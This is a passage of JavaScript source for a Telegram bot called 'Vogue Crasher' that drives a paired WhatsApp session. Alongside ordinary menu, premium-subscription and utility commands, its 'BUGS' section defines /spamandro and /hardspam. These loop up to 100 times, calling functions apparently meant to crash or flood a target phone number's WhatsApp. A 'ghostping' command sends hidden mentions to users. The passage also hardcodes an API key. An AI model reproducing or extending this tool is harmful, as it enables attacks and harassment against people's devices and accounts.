User        : ${ctx.from.first_name}
Developer   : @ScriptKits
Version     : 1.0 Pro
Prefix      : /

──────────────────────────

Support Team
@ScriptKits

──────────────────────────
Official Build by VOGUE CRASHER
</pre>`;
    
    const keyboard = [
        [
        {
            text: "Return to Main Menu",
            callback_data: "/start"
        }]
    ];
    
    try {
        
        await ctx.editMessageCaption(tqtoMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
        
    } catch (error) {
        
        if (
            error.response &&
            error.response.error_code === 400 &&
            error.response.description === "Bad Request: message is not modified"
        ) {
            
            await ctx.answerCbQuery();
            
            console.log(
                "[VOGUE CRASHER] Message update skipped because the content is identical."
            );
            
        } else {
            
            console.log(
                "[VOGUE CRASHER] Failed to update acknowledgement panel."
            );
            
        }
    }
});

//     _____ _____ _   _______ ___________            
//    /  ___|  ___| \ | |  _  \  ___| ___ \           
//    \ `--.| |__ |  \| | | | | |__ | |_/ /           
//     `--. \  __|| . ` | | | |  __||    /            
//    /\__/ / |___| |\  | |/ /| |___| |\ \            
//    \____/\____/\_| \_/___/ \____/\_| \_|           
//                                                    
//                                                    
//     _____ ________  ______  ___  ___   _   _______ 
//    /  __ \  _  |  \/  ||  \/  | / _ \ | \ | |  _  \
//    | /  \/ | | | .  . || .  . |/ /_\ \|  \| | | | |
//    | |   | | | | |\/| || |\/| ||  _  || . ` | | | |
//    | \__/\ \_/ / |  | || |  | || | | || |\  | |/ / 
//     \____/\___/\_|  |_/\_|  |_/\_| |_/\_| \_/___/  
//                                                    
//                                                    

bot.command("reqpair", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    const args = ctx.message.text.split(" ")[1];
    if (!args) return ctx.reply("🪧 ☇ Format: /reqpair 62×××");
    
    const phoneNumber = args.replace(/[^0-9]/g, "");
    if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");
    
    try {
        if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
        if (sock.authState.creds.registered) {
            return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
        }
        
        let customcode = "XXVOGUEX"
        const code = await sock.requestPairingCode(phoneNumber, customcode);
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;
        
        const pairingMenu = `
<pre>
VOGUE CRASH • PAIRING SYSTEM
──────────────────────────── 

Welcome, ${ctx.from.first_name}

This system is connected to the
Trash Matrix WhatsApp engine.

Session Information

Developer     : @ScriptKits
Version       : 1.0 Pro
Prefix        : /

────────────────────────────

Target Number
${phoneNumber}

Pairing Code
${formattedCode}

Connection Status
Waiting for Authentication

──────────────────────────────
Open WhatsApp Linked Devices and
enter the pairing code above to
complete the authorization process.
</pre>`;
        
        const sentMsg = await ctx.replyWithPhoto(thumbnailUrl, {
            caption: pairingMenu,
            parse_mode: "HTML"
        });
        
        lastPairingMessage = {
            chatId: ctx.chat.id,
            messageId: sentMsg.message_id,
            phoneNumber,
            pairingCode: formattedCode
        };
        
    } catch (err) {
        console.error(err);
    }
});

if (sock) {
    sock.ev.on("connection.update", async (update) => {
        if (update.connection === "open" && lastPairingMessage) {
            const updateConnectionMenu = `
<pre>
VOGUE CRASH • CONNECTION STATUS
──────────────────────────────

WhatsApp session has been successfully
authenticated and is now operational.

System Information

Developer     : @ScriptKits
Version       : 1.0 Pro
Prefix        : /

──────────────────────────────

Registered Number
${lastPairingMessage.phoneNumber}

Pairing Code
${lastPairingMessage.pairingCode}

Connection Status
Connected Successfully

──────────────────────────────
The sender session is active and ready
for command execution.
</pre>`;
            
            try {
                await bot.telegram.editMessageCaption(
                    lastPairingMessage.chatId,
                    lastPairingMessage.messageId,
                    undefined,
                    updateConnectionMenu, { parse_mode: "HTML" }
                );
            } catch (e) {}
        }
    });
}

//    ______ _____ _   _ _____ _     ___________ ___________ 
//    |  _  \  ___| | | |  ___| |   |  _  | ___ \  ___| ___ \
//    | | | | |__ | | | | |__ | |   | | | | |_/ / |__ | |_/ /
//    | | | |  __|| | | |  __|| |   | | | |  __/|  __||    / 
//    | |/ /| |___\ \_/ / |___| |___\ \_/ / |   | |___| |\ \ 
//    |___/ \____/ \___/\____/\_____/\___/\_|   \____/\_| \_|
//                                                           
//                                                           
//     _____ ________  ______  ___  ___   _   _______        
//    /  __ \  _  |  \/  ||  \/  | / _ \ | \ | |  _  \       
//    | /  \/ | | | .  . || .  . |/ /_\ \|  \| | | | |       
//    | |   | | | | |\/| || |\/| ||  _  || . ` | | | |       
//    | \__/\ \_/ / |  | || |  | || | | || |\  | |/ /        
//     \____/\___/\_|  |_/\_|  |_/\_| |_/\_| \_/___/         
//                                                           
//                                                           

let maintenanceMode = false;

const maintenanceMessage = `
<pre>
V O G U E  •  C R A S H E R
──────────────────────────

SYSTEM MAINTENANCE

Status      : Unavailable
Engine      : Updating
Access      : Restricted

──────────────────────────
The system is currently under maintenance.

Please wait until the maintenance
process has been completed.
</pre>`;


bot.use(async (ctx, next) => {

    if (ctx.from?.id == ownerID) {
        return next();
    }

    if (maintenanceMode) {

        if (ctx.callbackQuery) {
            return ctx.answerCbQuery(
                "System under maintenance.",
                {
                    show_alert: true
                }
            );
        }

        return ctx.replyWithPhoto(
            thumbnailUrl,
            {
                caption: maintenanceMessage,
                parse_mode: "HTML",

                reply_markup: {
                    inline_keyboard: [
                        [
                            {
                                text: "Developer",
                                url: "https://t.me/ScriptKits",
                                style: "danger"
                            }
                        ],
                        [
                            {
                                text: "System Status",
                                callback_data: "maintenance_status",
                                style: "danger"
                            }
                        ]
                    ]
                }
            }
        );
    }

    return next();
});


bot.action(
    "maintenance_status",
    async (ctx) => {

        return ctx.answerCbQuery(
            "Maintenance currently active.",
            {
                show_alert: true
            }
        );
    }
);

bot.command(
    "maintenance",
    async (ctx) => {

        if (ctx.from.id != ownerID) {
            return;
        }

        maintenanceMode = true;

        return ctx.reply(
`<pre>
V O G U E  •  C R A S H E R
──────────────────────────

MAINTENANCE ENABLED

Status      : Active
Access      : Owner Only

──────────────────────────
Public access has been disabled.
</pre>`,
            {
                parse_mode: "HTML"
            }
        );
    }
);

bot.command(
    "unmaintenance",
    async (ctx) => {

        if (ctx.from.id != ownerID) {
            return;
        }

        maintenanceMode = false;

        return ctx.reply(
`<pre>
V O G U E  •  C R A S H E R
──────────────────────────

MAINTENANCE DISABLED

Status      : Online
Access      : Public Restored

──────────────────────────
System access has been restored.
</pre>`,
            {
                parse_mode: "HTML"
            }
        );
    }
);

//    ____________ ________  ________ _   ____  ___   
//    | ___ \ ___ \  ___|  \/  |_   _| | | |  \/  |   
//    | |_/ / |_/ / |__ | .  . | | | | | | | .  . |   
//    |  __/|    /|  __|| |\/| | | | | | | | |\/| |   
//    | |   | |\ \| |___| |  | |_| |_| |_| | |  | |   
//    \_|   \_| \_\____/\_|  |_/\___/ \___/\_|  |_/   
//                                                    
//                                                    
//     _____ ________  ______  ___  ___   _   _______ 
//    /  __ \  _  |  \/  ||  \/  | / _ \ | \ | |  _  \
//    | /  \/ | | | .  . || .  . |/ /_\ \|  \| | | | |
//    | |   | | | | |\/| || |\/| ||  _  || . ` | | | |
//    | \__/\ \_/ / |  | || |  | || | | || |\  | |/ / 
//     \____/\___/\_|  |_/\_|  |_/\_| |_/\_| \_/___/  
//                                                    
//                                                    :

bot.command('addprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addprem [user_id] [duration_in_days]");
    }
    const userId = args[1];
    const duration = parseInt(args[2]);
    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka (dalam hari)");
    }
    const expiryDate = addPremiumUser(userId, duration);
    ctx.reply(`✅ ☇ ${userId} berhasil ditambahkan sebagai pengguna premium sampai ${expiryDate}`);
});

bot.command('listprem', async (ctx) => {
    
    if (ctx.from.id != ownerID) {
        return ctx.reply(
            `Access Denied

This command is restricted to the system owner.`
        );
    }
    
    const premiumUsers = loadPremiumUsers();
    
    const userIds = Object.keys(premiumUsers);
    
    if (userIds.length === 0) {
        return ctx.reply(
            `<pre>
┏━ V O G U E • P R E M I U M • L I S T ━┓

No premium users are currently registered.

┗━ System returned empty result ━┛
</pre>`,
            {
                parse_mode: "HTML"
            }
        );
    }
    
    let text = "";
    let no = 1;
    
    for (const id of userIds) {
        
        const expiry = premiumUsers[id];
        
        const expired =
            moment(expiry, 'DD-MM-YYYY')
            .isBefore(moment());
        
        text += `
${no}. USER INFORMATION

› User ID
  ${id}
› Access Status
  ${expired ? "Expired" : "Active"}
› Expiration Date
  ${expiry}

────────────────────────────
`;
        
        no++;
    }
    
    const result = `
<pre>
┏━ V O G U E • P R E M I U M • L I S T ━┓

⌬ REGISTERED PREMIUM USERS

Total Users : ${userIds.length}

────────────────────────────
${text}
┗━ End Of Premium Directory ━┛
</pre>`;
    
    if (result.length > 1024) {
        return ctx.reply(
            result,
            {
                parse_mode: "HTML"
            }
        );
    }
    
    ctx.replyWithPhoto(thumbnailUrl, {
        caption: result,
        parse_mode: "HTML"
    });
    
});

bot.command('delprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delprem [user_id]");
    }
    const userId = args[1];
    removePremiumUser(userId);
    ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar pengguna premium`);
});

bot.command('addgrup', async (ctx) => {
    
    if (ctx.from.id != ownerID) {
        return ctx.reply(
            `Access Denied

This command is restricted to the system owner.`
        );
    }
    
    if (
        ctx.chat.type !== 'group' &&
        ctx.chat.type !== 'supergroup'
    ) {
        return ctx.reply(
            `Invalid Context

This command can only be used inside a group.`
        );
    }
    
    const chatId = ctx.chat.id.toString();
    
    let groups = loadPremiumGroups();
    
    if (groups.includes(chatId)) {
        return ctx.reply(
            `Premium Group Already Registered

This group already has premium access enabled.`
        );
    }
    
    groups.push(chatId);
    
    savePremiumGroups(groups);
    
    ctx.reply(
        `<pre>
┏━ V O G U E • P R E M I U M • G R O U P ━┓

Premium access has been successfully
enabled for this group.

› Group ID
  ${chatId}
› Status
  Active

All members inside this group can now
access premium commands.

┗━ Access authorization completed ━┛
</pre>`,
        {
            parse_mode: "HTML"
        }
    );
    
});

bot.command('delgrup', async (ctx) => {
    
    if (ctx.from.id != ownerID) {
        return ctx.reply(
            `Access Denied

This command is restricted to the system owner.`
        );
    }
    
    const chatId = ctx.chat.id.toString();
    
    let groups = loadPremiumGroups();
    
    if (!groups.includes(chatId)) {
        return ctx.reply(
            `Premium Group Not Found

This group is not registered as premium.`
        );
    }
    
    groups = groups.filter(
        id => id !== chatId
    );
    
    savePremiumGroups(groups);
    
    ctx.reply(
        `<pre>
┏━ V O G U E • P R E M I U M • G R O U P ━┓

Premium access has been revoked
from this group.

› Group ID
  ${chatId}

› Status
  Removed

┗━ Access revocation completed ━┛
</pre>`,
        {
            parse_mode: "HTML"
        }
    );
    
});

//     _____ _____  _____ _      _____                
//    |_   _|  _  ||  _  | |    /  ___|               
//      | | | | | || | | | |    \ `--.                
//      | | | | | || | | | |     `--. \               
//      | | \ \_/ /\ \_/ / |____/\__/ /               
//      \_/  \___/  \___/\_____/\____/                
//                                                    
//               TOOLS COMMAND                                     
//     _____ ________  ______  ___  ___   _   _______ 
//    /  __ \  _  |  \/  ||  \/  | / _ \ | \ | |  _  \
//    | /  \/ | | | .  . || .  . |/ /_\ \|  \| | | | |
//    | |   | | | | |\/| || |\/| ||  _  || . ` | | | |
//    | \__/\ \_/ / |  | || |  | || | | || |\  | |/ / 
//     \____/\___/\_|  |_/\_|  |_/\_| |_/\_| \_/___/  
//                                                    
//

bot.command("ghostping", async (ctx) => {

    try {

        const args = ctx.message.text.split(" ");

        let targetId;
        let targetName;

        if (ctx.message.reply_to_message) {

            targetId = ctx.message.reply_to_message.from.id;
            targetName = ctx.message.reply_to_message.from.first_name;

        } else if (args[1]) {

            targetId = args[1].replace("@", "");
            targetName = args[1];

        } else {

            return ctx.reply(
`Usage:
/ghostping <id>

Or reply user:
/ghostping`
            );
        }

        const sent = await ctx.reply(
`\u2060`,
            {
                reply_to_message_id: ctx.message.message_id,
                entities: [
                    {
                        offset: 0,
                        length: 1,
                        type: "text_mention",
                        user: {
                            id: Number(targetId),
                            is_bot: false,
                            first_name: targetName
                        }
                    }
                ]
            }
        );

        setTimeout(async () => {

            try {

                await ctx.telegram.deleteMessage(
                    ctx.chat.id,
                    sent.message_id
                );

            } catch {}

        }, 1500);

        await ctx.replyWithPhoto(
            thumbnailUrl,
            {
                caption:
`<pre>
V O G U E • GHOST PING
────────────────────────

Status
Success

Target
${targetName}

User ID
${targetId}

Mode
Invisible Mention

────────────────────────
Ghost ping dispatched successfully.
</pre>`,
                parse_mode: "HTML"
            }
        );

    } catch (err) {

        console.log(err);

        return ctx.reply(
            "Failed to execute ghost ping."
        );
    }
});

bot.command("sticker", async (ctx) => {

    try {

        const reply =
            ctx.message.reply_to_message;

        if (
            !reply ||
            (
                !reply.photo &&
                !reply.document &&
                !reply.video &&
                !reply.animation
            )
        ) {

            return ctx.reply(
`Invalid Format

Reply image / gif / video with:
/sticker`
            );
        }

        const loading = await ctx.replyWithPhoto(
            thumbnailUrl,
            {
                caption:
`
<pre>
V O G U E • STICKER ENGINE
──────────────────────────

Status      : Processing

──────────────────────────
Converting media to sticker...
</pre>
`,
                parse_mode: "HTML"
            }
        );

        let fileId;
        let isVideo = false;

        if (reply.photo) {

            fileId =
                reply.photo[
                    reply.photo.length - 1
                ].file_id;
        }

        else if (reply.document) {

            fileId =
                reply.document.file_id;

            if (
                reply.document.mime_type?.includes("video")
            ) {
                isVideo = true;
            }
        }

        else if (reply.video) {

            fileId =
                reply.video.file_id;

            isVideo = true;
        }

        else if (reply.animation) {

            fileId =
                reply.animation.file_id;

            isVideo = true;
        }

        const file =
            await ctx.telegram.getFile(fileId);

        const fileUrl =
`https://api.telegram.org/file/bot${bot.token}/${file.file_path}`;

        const response =
            await axios.get(
                fileUrl,
                {
                    responseType: "arraybuffer"
                }
            );

        const buffer =
            Buffer.from(response.data);

        if (isVideo) {

            await ctx.replyWithSticker(
                {
                    source: buffer
                }
            );

        } else {

            await ctx.replyWithSticker(
                {
                    source: buffer
                }
            );
        }

        await ctx.telegram.deleteMessage(
            ctx.chat.id,
            loading.message_id
        );

    } catch (err) {

        console.log(err);

        return ctx.replyWithPhoto(
            thumbnailUrl,
            {
                caption:
`
<pre>
V O G U E • STICKER ENGINE
──────────────────────────

Status      : Failed

──────────────────────────
Unable to convert media
to sticker format.
</pre>
`,
                parse_mode: "HTML"
            }
        );
    }
});

bot.command("tourl", async (ctx) => {

    try {
        const apiKey =
            "8f2a09515256735774c3d906b6c997f9";

        const reply =
            ctx.message.reply_to_message;

        if (
            !reply ||
            (
                !reply.photo &&
                !reply.document &&
                !reply.sticker
            )
        ) {

            return ctx.reply(
`Reply image/sticker/document

Usage:
/tourl`
            );
        }

        let fileId;

        if (reply.photo) {

            fileId =
                reply.photo[
                    reply.photo.length - 1
                ].file_id;
        }

        else if (reply.document) {

            fileId =
                reply.document.file_id;
        }

        else if (reply.sticker) {

            fileId =
                reply.sticker.file_id;
        }

        const loading =
            await ctx.replyWithPhoto(
                thumbnailUrl,
                {
                    caption:
`
<pre>
V O G U E • TO URL
────────────────────────

Status
Uploading media...

Please wait.
</pre>
`,
                    parse_mode: "HTML"
                }
            );

        const file =
            await ctx.telegram.getFile(fileId);

        const fileUrl =
            `https://api.telegram.org/file/bot${bot.token}/${file.file_path}`;

        const response =
            await axios.get(fileUrl, {
                responseType: "arraybuffer"
            });

        const buffer =
            Buffer.from(response.data);

        const form =
            new FormData();

        form.append(
            "image",
            buffer.toString("base64")
        );

        const upload =
            await axios.post(
                `https://api.imgbb.com/1/upload?key=${apiKey}`,
                form,
                {
                    headers: form.getHeaders()
                }
            );

        const result =
            upload.data;

        if (!result.success) {

            return ctx.reply(
                "Upload failed."
            );
        }

        const data =
            result.data;

        await ctx.telegram.editMessageCaption(
            ctx.chat.id,
            loading.message_id,
            undefined,

`
<pre>
V O G U E • TO URL
────────────────────────

Upload Status
Success

Image Information

File Name
${data.image.filename}

Size
${data.size} bytes

Resolution
${data.width}x${data.height}

────────────────────────

Direct URL
${data.url}

Viewer URL
${data.url_viewer}
</pre>
`,
            {
                parse_mode: "HTML",

                reply_markup: {
                    inline_keyboard: [
                        [
                            {
                                text: "Open Image",
                                url: data.url,
                                style: "primary"
                            }
                        ],
                        [
                            {
                                text: "Viewer Link",
                                url: data.url_viewer,
                                style: "success"
                            }
                        ]
                    ]
                }
            }
        );

    } catch (err) {

        console.log(err);

        return ctx.reply(
            "Failed to upload media."
        );
    }
});

bot.command("update", async (ctx) => {

    if (ctx.from.id != ownerID) {
        return ctx.reply(
`Access Denied

This command is restricted to the system owner.`
        );
    }

    const { exec } = require("child_process");

    const msg = await ctx.reply(
`<pre>
V O G U E  •  U P D A T E
──────────────────────────

Checking repository...
Fetching latest commit...
Preparing update process...

Status : RUNNING
</pre>`,
        { parse_mode: "HTML" }
    );

    exec("git pull", async (error, stdout, stderr) => {

        if (error) {
            return ctx.telegram.editMessageText(
                ctx.chat.id,
                msg.message_id,
                null,
`<pre>
V O G U E  •  U P D A T E
──────────────────────────

Update Failed

${error.message}
</pre>`,
                { parse_mode: "HTML" }
            );
        }

        await ctx.telegram.editMessageText(
            ctx.chat.id,
            msg.message_id,
            null,
`<pre>
V O G U E  •  U P D A T E
──────────────────────────

Repository updated successfully

${stdout}
</pre>`,
            { parse_mode: "HTML" }
        );

        process.exit(0);

    });

});

bot.command('restartbot', async (ctx) => {
    
    if (ctx.from.id != ownerID) {
        return ctx.reply(
            `Access Denied

This command is restricted to the system owner.`
        );
    }
    
    const msg = await ctx.reply(
        `<pre>
V O G U E  •  S Y S T E M
──────────────────────────

RESTART OPERATION

Status      : Initializing
Engine      : Restart Sequence
Process     : Rebuilding Runtime

──────────────────────────
The bot system is preparing for restart execution.
</pre>`,
        {
            parse_mode: "HTML"
        }
    );
    
    setTimeout(async () => {
        
        try {
            
            await ctx.telegram.editMessageText(
                ctx.chat.id,
                msg.message_id,
                undefined,
                `<pre>
V O G U E  •  S Y S T E M
──────────────────────────

RESTART OPERATION

Status      : Complete
Engine      : Online
Process     : Runtime Recovered

──────────────────────────
The bot system has been
successfully restarted.
</pre>`,
                {
                    parse_mode: "HTML"
                }
            );
            
        } catch {}
        
        process.exit(1);
        
    }, 3000);
    
});

bot.command('killsession', async (ctx) => {
    
    if (ctx.from.id != ownerID) {
        return ctx.reply(
            `Access Denied

This command is restricted to the system owner.`
        );
    }
    
    const msg = await ctx.reply(
        `<pre>
V O G U E  •  S E S S I O N
──────────────────────────

SESSION TERMINATION

Status      : Processing
Engine      : Active
Action      : Removing Auth Session

──────────────────────────
The system is currently deleting all active WhatsApp session data.
</pre>`,
        {
            parse_mode: "HTML"
        }
    );
    
    try {
        
        if (sock) {
            try {
                await sock.logout();
            } catch {}
        }
        
        const sessionPath = "./session";
        
        if (fs.existsSync(sessionPath)) {
            fs.rmSync(sessionPath, {
                recursive: true,
                force: true
            });
        }
        
        isWhatsAppConnected = false;
        
        await ctx.telegram.editMessageText(
            ctx.chat.id,
            msg.message_id,
            undefined,
            `<pre>
V O G U E  •  S E S S I O N
──────────────────────────

SESSION TERMINATION

Status      : Complete
Engine      : Offline
Action      : Session Destroyed

──────────────────────────
All WhatsApp session files have
been successfully removed.

Re-pairing is required before
the sender can reconnect.
</pre>`,
            {
                parse_mode: "HTML"
            }
        );
        
        console.log(
            `[VOGUE CRASHER] Session terminated successfully`
        );
        
    } catch (error) {
        
        await ctx.telegram.editMessageText(
            ctx.chat.id,
            msg.message_id,
            undefined,
            `<pre>
V O G U E  •  S E S S I O N
──────────────────────────

SESSION TERMINATION

Status      : Failed
Engine      : Error
Action      : Abort Operation

──────────────────────────
The system failed to remove
the current session data.
</pre>`,
            {
                parse_mode: "HTML"
            }
        );
        
        console.log(
            `[VOGUE CRASHER] Session termination failed`
        );
        
    }
    
});

bot.command("info", async (ctx) => {

    const totalRam = (os.totalmem() / 1024 / 1024 / 1024).toFixed(2);
    const freeRam = (os.freemem() / 1024 / 1024 / 1024).toFixed(2);
    const usedRam = (totalRam - freeRam).toFixed(2);

    const uptime = process.uptime();

    const days = Math.floor(uptime / 86400);
    const hours = Math.floor((uptime % 86400) / 3600);
    const minutes = Math.floor((uptime % 3600) / 60);
    const seconds = Math.floor(uptime % 60);

    const runtime =
        `${days}d ${hours}h ${minutes}m ${seconds}s`;

    const cpuModel = os.cpus()[0].model;
    const cpuCores = os.cpus().length;
    const cpuArch = os.arch();
    const cpuLoad = os.loadavg()[0].toFixed(2);

    const platform = os.platform();
    const hostname = os.hostname();

    const senderStatus =
        isWhatsAppConnected
            ? "Connected"
            : "Disconnected";

    const currentTime = moment()
        .tz("Asia/Jakarta")
        .format("DD/MM/YYYY HH:mm:ss");

    const pages = [

`<pre>
┏━ V O G U E • I N F O ━┓

⌬ BOT INFORMATION

› Bot Name
  Vogue Crasher

› Version
  1.0 Pro

› Developer
  @ScriptKits

› Runtime
  ${runtime}

› Status
  Active and Operational

› Process ID
  ${process.pid}

› NodeJS Version
  ${process.version}

┗━━━━━━━━━━━━━━━━━━━━━━┛
</pre>`,

`<pre>
┏━ W H A T S A P P ━┓

⌬ CONNECTION INFORMATION

› Sender Status
  ${senderStatus}

› Connection Mode
  Single Device

› Current Time
  ${currentTime} WIB

› Platform
  Telegram x WhatsApp Bridge

› Service State
  Stable Connection

┗━━━━━━━━━━━━━━━━━━━━━━┛
</pre>`,

`<pre>
┏━ V P S • I N F O ━┓

⌬ SERVER INFORMATION

› Hostname
  ${hostname}

› Platform
  ${platform}

› Architecture
  ${cpuArch}

› CPU Model
  ${cpuModel}

› CPU Cores
  ${cpuCores} Cores

› CPU Load
  ${cpuLoad}

┗━━━━━━━━━━━━━━━━━━━━━━┛
</pre>`,

`<pre>
┏━ R A M • U S A G E ━┓

⌬ MEMORY INFORMATION

› Total RAM
  ${totalRam} GB

› Used RAM
  ${usedRam} GB

› Free RAM
  ${freeRam} GB

› Memory Usage
  ${(
      (usedRam / totalRam) * 100
  ).toFixed(1)}%

────────────────────────

System operating normally
without critical exception
or service failure.

┗━━━━━━━━━━━━━━━━━━━━━━┛
</pre>`

    ];

    let currentPage = 0;

    const keyboard = (page) => ({
        inline_keyboard: [
            [
                {
                    text: "◀ Back",
                    callback_data: `info_back_${page}`
                },
                {
                    text: `${page + 1}/${pages.length}`,
                    callback_data: "info_page"
                },
                {
                    text: "Next ▶",
                    callback_data: `info_next_${page}`
                }
            ]
        ]
    });

    await ctx.replyWithPhoto(thumbnailUrl, {
        caption: pages[currentPage],
        parse_mode: "HTML",
        reply_markup: keyboard(currentPage)
    });

});

bot.on("callback_query", async (ctx) => {

    const data = ctx.callbackQuery.data;

    if (!data.startsWith("info_")) return;

    const totalPages = 4;

    let page = parseInt(data.split("_")[2]);

    if (data.startsWith("info_next")) {
        page = (page + 1) % totalPages;
    }

    if (data.startsWith("info_back")) {
        page = (page - 1 + totalPages) % totalPages;
    }

    const os = require("os");
    const moment = require("moment-timezone");

    const totalRam = (os.totalmem() / 1024 / 1024 / 1024).toFixed(2);
    const freeRam = (os.freemem() / 1024 / 1024 / 1024).toFixed(2);
    const usedRam = (totalRam - freeRam).toFixed(2);

    const uptime = process.uptime();

    const days = Math.floor(uptime / 86400);
    const hours = Math.floor((uptime % 86400) / 3600);
    const minutes = Math.floor((uptime % 3600) / 60);
    const seconds = Math.floor(uptime % 60);

    const runtime =
        `${days}d ${hours}h ${minutes}m ${seconds}s`;

    const cpuModel = os.cpus()[0].model;
    const cpuCores = os.cpus().length;
    const cpuArch = os.arch();
    const cpuLoad = os.loadavg()[0].toFixed(2);

    const platform = os.platform();
    const hostname = os.hostname();

    const senderStatus =
        isWhatsAppConnected
            ? "Connected"
            : "Disconnected";

    const currentTime = moment()
        .tz("Asia/Jakarta")
        .format("DD/MM/YYYY HH:mm:ss");

    const pages = [

`<pre>
┏━ V O G U E • I N F O ━┓

⌬ BOT INFORMATION

› Bot Name
  Vogue Crasher

› Version
  1.0 Pro

› Developer
  @ScriptKits

› Runtime
  ${runtime}

› Status
  Active and Operational

› Process ID
  ${process.pid}

› NodeJS Version
  ${process.version}

┗━━━━━━━━━━━━━━━━━━━━━━┛
</pre>`,

`<pre>
┏━ W H A T S A P P ━┓

⌬ CONNECTION INFORMATION

› Sender Status
  ${senderStatus}

› Connection Mode
  Single Device

› Current Time
  ${currentTime} WIB

› Platform
  Telegram x WhatsApp Bridge

› Service State
  Stable Connection

┗━━━━━━━━━━━━━━━━━━━━━━┛
</pre>`,

`<pre>
┏━ V P S • I N F O ━┓

⌬ SERVER INFORMATION

› Hostname
  ${hostname}

› Platform
  ${platform}

› Architecture
  ${cpuArch}

› CPU Model
  ${cpuModel}

› CPU Cores
  ${cpuCores} Cores

› CPU Load
  ${cpuLoad}

┗━━━━━━━━━━━━━━━━━━━━━━┛
</pre>`,

`<pre>
┏━ R A M • U S A G E ━┓

⌬ MEMORY INFORMATION

› Total RAM
  ${totalRam} GB

› Used RAM
  ${usedRam} GB

› Free RAM
  ${freeRam} GB

› Memory Usage
  ${(
      (usedRam / totalRam) * 100
  ).toFixed(1)}%

────────────────────────

System operating normally
without critical exception
or service failure.

┗━━━━━━━━━━━━━━━━━━━━━━┛
</pre>`

    ];

    const keyboard = {
        inline_keyboard: [
            [
                {
                    text: "◀ Back",
                    callback_data: `info_back_${page}`
                },
                {
                    text: `${page + 1}/${pages.length}`,
                    callback_data: "info_page"
                },
                {
                    text: "Next ▶",
                    callback_data: `info_next_${page}`
                }
            ]
        ]
    };

    try {

        await ctx.editMessageCaption(
            pages[page],
            {
                parse_mode: "HTML",
                reply_markup: keyboard
            }
        );

        await ctx.answerCbQuery();

    } catch (e) {}

});

bot.command('ping', async (ctx) => {
    
    const start = Date.now();
    
    const msg = await ctx.reply(
        `<pre>
V O G U E  •  N E T W O R K
──────────────────────────

LATENCY SCAN

Status      : Scanning
Host        : Telegram API
Engine      : Measuring Response

──────────────────────────
Please wait while the system
analyzes network latency.
</pre>`,
        {
            parse_mode: "HTML"
        }
    );
    
    setTimeout(async () => {
        
        const ping = Date.now() - start;
        
        await ctx.telegram.editMessageText(
            ctx.chat.id,
            msg.message_id,
            undefined,
            `<pre>
V O G U E  •  N E T W O R K
──────────────────────────

LATENCY SCAN

Status      : Complete
Response    : ${ping} ms
Connection  : Stable

──────────────────────────
System response time has
been successfully analyzed.
</pre>`,
            {
                parse_mode: "HTML"
            }
        );
        
    }, 2000);
    
});

//    ______ _   _ _____  _____                       
//    | ___ \ | | |  __ \/  ___|                      
//    | |_/ / | | | |  \/\ `--.                       
//    | ___ \ | | | | __  `--. \                      
//    | |_/ / |_| | |_\ \/\__/ /                      
//    \____/ \___/ \____/\____/                       
//                                                    
//                                                    
//     _____ ________  ______  ___  ___   _   _______ 
//    /  __ \  _  |  \/  ||  \/  | / _ \ | \ | |  _  \
//    | /  \/ | | | .  . || .  . |/ /_\ \|  \| | | | |
//    | |   | | | | |\/| || |\/| ||  _  || . ` | | | |
//    | \__/\ \_/ / |  | || |  | || | | || |\  | |/ / 
//     \____/\___/\_|  |_/\_|  |_/\_| |_/\_| \_/___/  
//                                                    
//

bot.command('spamandro', checkExecutionLimit, checkWhatsAppConnection, checkPremiumAccess, async (ctx) => {
    
    let q = ctx.message?.text?.split(" ")[1];
    
    if (!q) return ctx.reply(
        `Invalid Format

Usage:
/spamandro <target_number>

Example:
/spamandro 628xxxxxxxx`
    );
    
    let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    
    try {
        
        const sent = await ctx.replyWithPhoto(thumbnailUrl, {
            caption: `
<pre>
V O G U E  •  C R A S H E R
──────────────────────────

EXECUTION STATUS

Target      : ${q}
Status      : Success

──────────────────────────
</pre>`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: "Check Target",
                        url: `https://wa.me/${q}`,
                        style: "primary"
                    }]
                ]
            }
        });
        
        (async () => {
            
            const instanceId = Date.now() + Math.random();
            
            for (let i = 0; i < 100; i++) {
                try {
                    if (!sock) {
                        throw new Error("Socket unavailable");
                    }
                    await DelayIosSpam(sock, target);
                    await Xvzzk(sock, target);
                    await sleep(3000)
                } catch (e) {
                    console.log(`[WORKER ${instanceId}] Error: ${e.message}`);
                   
                }
            }
            
            console.log(`[WORKER ${instanceId}] Done for ${q}`);
            
        })();
        
    } catch (error) {
        
        ctx.reply(
            `Operation Failed

The system was unable to execute the requested module.
Please verify the target input and system status before retrying.`
        );
        
        console.log(`[VOGUE CRASHER] Execution failed for ${q}`);
    }
});

bot.command('hardspam', checkExecutionLimit, checkWhatsAppConnection, checkPremiumAccess, async (ctx) => {
    
    let args = ctx.message?.text?.split(" ");
    
    let q = args[1];
    
    let executionCount =
        parseInt(args[2]) || 1;
    
    if (executionCount > 100) {
        executionCount = 100;
    }
    
    if (!q) return ctx.reply(
        `Invalid Format

Usage:
/hardspam <target_number> <amount>

Example:
/hardspam 628xxxxxxxx 50`
    );
    
    let target =
        q.replace(/[^0-9]/g, "") +
        "@s.whatsapp.net";
    
    try {
        
        const sent =
            await ctx.replyWithPhoto(
                thumbnailUrl,
                {
                    caption: `
<pre>
V O G U E  •  C R A S H E R
──────────────────────────

EXECUTION STATUS

Target      : ${q}
